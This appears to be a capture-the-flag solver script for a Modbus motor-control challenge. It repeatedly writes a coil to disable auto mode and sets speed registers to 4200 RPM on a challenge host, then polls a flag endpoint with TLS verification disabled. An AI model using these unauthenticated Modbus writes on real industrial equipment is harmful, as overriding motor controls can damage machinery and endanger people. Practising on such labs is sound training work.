#!/usr/bin/env python3
"""
Retro Motor Override CTF - Continuous Flag Monitor
Continuously sets Modbus controls and checks for the flag
Flag format: starts with csc26
"""
from pymodbus.client import ModbusTcpClient
import requests
import urllib3
import time
import sys

urllib3.disable_warnings()

HOST = 'motoroverride-csc26.cybersecuritychallenge.al'
FLAG_URL = 'https://retromotoroverride-csc26.cybersecuritychallenge.al/flag'

def set_modbus_controls():
    """Set the Modbus controls as per challenge requirements"""
    try:
        client = ModbusTcpClient(HOST, port=502, timeout=5)
        if not client.connect():
            return False
        
        # Disable auto mode (coil 0 = False) and set speed
        client.write_coil(address=0, value=False)
        client.write_register(address=0, value=4200)
        
        # Also set register 1 just in case
        client.write_register(address=1, value=4200)
        
        client.close()
        return True
    except Exception as e:
        print(f'[!] Modbus error: {e}')
        return False

def get_flag():
    """Fetch flag from the web endpoint"""
    try:
        resp = requests.get(FLAG_URL, verify=False, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            flag = data.get('flag', '')
            # Flag should start with csc26
            if flag and 'Waiting' not in flag and 'csc26' in flag.lower():
                return flag
            elif flag and 'Waiting' not in flag and flag != '':
                print(f"    ⚠️  Got non-empty flag: {flag}")
                return flag
        return None
    except Exception as e:
        print(f'[!] HTTP error: {e}')
        return None

def main():
    print("="*70)
    print("  Retro Motor Override - Continuous Flag Monitor")
    print("="*70)
    print(f"\nTarget: {HOST}")
    print(f"Flag URL: {FLAG_URL}")
    print(f"Expected flag format: csc26{{...}}")
    print("\nPress Ctrl+C to stop\n")
    print("-"*70)
    
    iteration = 0
    flag_found = False
    
    while True:
        iteration += 1
        timestamp = time.strftime('%H:%M:%S')
        
        print(f"\n[{timestamp}] Iteration {iteration}")
        print("[*] Setting Modbus controls...")
        
        if set_modbus_controls():
            print("    ✓ Auto mode: DISABLED (coil 0 = False)")
            print("    ✓ Motor speed: 4200 RPM (register 0 & 1 = 4200)")
            
            print("[*] Fetching flag...")
            flag = get_flag()
            
            if flag:
                if not flag_found:
                    print(f"\n{'='*70}")
                    print(f"{'🎉 FLAG FOUND! 🎉':^70}")
                    print(f"{'='*70}")
                    print(f"\n{flag}\n")
                    print(f"{'='*70}")
                    flag_found = True
                    print("\nContinuing to monitor...")
                else:
                    print(f"    ✓ Flag still available: {flag}")
            else:
                print("    ⏳ No flag yet (waiting for correct settings...)")
        
        print(f"[*] Next check in 10 seconds...")
        time.sleep(10)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Stopped by user")
        sys.exit(0)

